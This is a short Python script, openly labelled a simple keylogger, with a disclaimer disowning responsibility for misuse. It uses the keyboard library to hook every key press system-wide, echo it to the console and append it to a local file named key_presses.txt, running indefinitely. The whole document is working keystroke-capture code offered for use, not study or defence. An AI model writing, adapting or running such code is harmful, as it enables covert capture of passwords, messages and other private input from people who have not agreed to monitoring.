# Just a simple keylogger
# DISCLAIMER: I dont take any responsibility for any misuse of this tool 
import keyboard

# Define the output file
output_file = "key_presses.txt"

#print("Press '`' to quit.")

def on_key_event(event):
    # Translate specific keys to their actual representations
    if event.name == "space":
        key_pressed = " "
    elif event.name == "backspace":
        key_pressed = "\b"
    elif event.name.lower() not in "abcdefghijklmnopqrstuvwxyz1234567890-=[]\;',./!@#$%^&*()_+{\}|:\"<>\\?":
        key_pressed = event.name + " "
    else:
        key_pressed = event.name

    print(key_pressed, end='', flush=True)  # Print to console without newline, flush to ensure immediate output
    with open(output_file, "a") as file:
        file.write(key_pressed)  # Write to file

# Set up the event listener for key presses
keyboard.on_press(on_key_event)

# Keep the script running
#keyboard.wait('~')  # Exit the script when '`' is pressed
keyboard.wait()
